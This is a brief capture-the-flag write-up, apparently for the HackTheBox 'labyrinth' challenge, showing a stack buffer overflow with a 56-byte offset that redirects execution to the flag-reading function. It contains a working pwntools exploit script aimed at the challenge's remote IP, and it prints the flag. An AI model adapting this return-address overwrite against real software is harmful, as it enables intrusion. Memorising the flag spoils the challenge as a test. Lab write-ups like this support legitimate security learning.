Through experimentation we find that the buffer overflow happens at 56 characters. We see a function called `escape_plan` that opens and reads the flag so we need to jump to that.

![image](https://user-images.githubusercontent.com/80063008/227556505-c3fb8ab8-6252-4712-8917-68d6be77269a.png)

The address can be found using gdb:

![image](https://user-images.githubusercontent.com/80063008/227556670-464f1ccd-7578-416c-88e2-b71f08b960a0.png)

However, jumping at that address was only printing the ASCII artwork showing success but not the flag. I assumed the flag is printed after that so I moved to `0x401256` and got the flag.

My script to jump the required function:

```python
#!/usr/bin/python3

from pwn import *

# io = process('./labyrinth')
io = remote('165.232.108.200', 32639)

io.recvuntil(b'>> ')
io.sendline(b'69')
io.recvuntil(b'>> ')

payload = b'A' * 56
payload += p64(0x401256)

io.sendline(payload)
io.interactive()
```

![image](https://user-images.githubusercontent.com/80063008/227555677-e7533c8b-193f-4f73-8049-6fcc11d10737.png)

HTB{3sc4p3_fr0m_4b0v3}